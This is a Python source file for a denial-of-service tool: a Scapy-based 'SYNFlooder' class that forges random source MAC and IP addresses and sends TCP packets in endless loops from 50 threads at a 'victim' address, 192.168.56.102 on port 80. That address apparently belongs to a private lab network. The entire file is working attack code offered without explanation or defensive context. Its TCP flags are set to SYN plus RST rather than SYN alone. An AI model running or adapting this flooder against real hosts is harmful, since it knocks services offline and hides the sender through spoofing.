from ip_spoof import generate_ip
from mac_spoof import generate_mac

from scapy.all import Ether, IP, TCP, sendp

import threading
import time


class SYNFlooder:
    def __init__(
        self, victim_ip: str, net: str, net_mask: str, victim_port: int = 80
    ) -> None:
        self.victim_ip = victim_ip
        self.net = net
        self.net_mask = net_mask
        self.victim_port = victim_port

    def create_packet(self):
        ethernet = Ether(src=generate_mac())
        ip = IP(src=generate_ip(self.net, self.net_mask), dst=self.victim_ip)
        tcp = TCP(dport=self.victim_port, flags="SR")

        packet = ethernet / ip / tcp

        return packet

    def flood(self, delay: float = 0.0):
        while True:
            packet = self.create_packet()

            sendp(packet)
            time.sleep(delay)

    def run(self, number_of_threads: int = 1):
        threads = []

        for i in range(number_of_threads):
            thread = threading.Thread(target=self.flood, args=(0.0,), name=f"Thread {i}")
            threads.append(thread)

            thread.start()

        for thread in threads:
            thread.join()


def main():
    syn_flooder = SYNFlooder("192.168.56.102", "192.168.56.0", "/24", 80)
    syn_flooder.run(50)

if __name__ == "__main__":
    main()
